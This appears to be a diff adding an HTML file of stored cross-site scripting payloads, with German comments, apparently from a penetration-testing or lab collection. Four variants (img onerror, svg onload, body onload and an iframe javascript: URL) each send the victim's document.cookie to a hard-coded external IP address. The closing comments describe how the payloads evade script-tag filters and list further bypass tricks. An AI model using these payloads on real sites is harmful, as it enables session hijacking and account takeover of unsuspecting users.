@@ -1,0 +1,35 @@
+<!--
+XSS Cookie Stealer - Image-based Stored XSS Payload
+Vorteil: Funktioniert auch wenn <script> Tags gefiltert werden
+-->
+
+<img src=x onerror="fetch('http://141.87.56.31:8888/steal?c='+encodeURIComponent(document.cookie))">
+
+<!--
+Alternative Varianten:
+-->
+
+<!-- SVG-basiert -->
+<svg onload="fetch('http://141.87.56.31:8888/steal?c='+encodeURIComponent(document.cookie))"></svg>
+
+<!-- Body-Tag (falls in größerem Kontext) -->
+<body onload="fetch('http://141.87.56.31:8888/steal?c='+encodeURIComponent(document.cookie))">
+
+<!-- IFrame mit JavaScript-URL -->
+<iframe src="javascript:fetch('http://141.87.56.31:8888/steal?c='+encodeURIComponent(document.cookie))"></iframe>
+
+<!--
+Erklärung:
+- Nutzt HTML Event-Handler statt <script> Tags
+- onerror wird ausgeführt wenn Bild nicht lädt (src=x ist ungültig)
+- Umgeht einfache <script> Tag Filter
+
+Bypass-Techniken:
+- Case-Variation: <ScRiPt>, <sCrIpT>
+- Null-Bytes: <script\x00>
+- HTML-Entities: &lt;script&gt;
+- Unicode: \u003cscript\u003e
+
+Angriffsszenario:
+Identisch zu stored_bio_basic.html, aber robuster gegen Filter
+-->
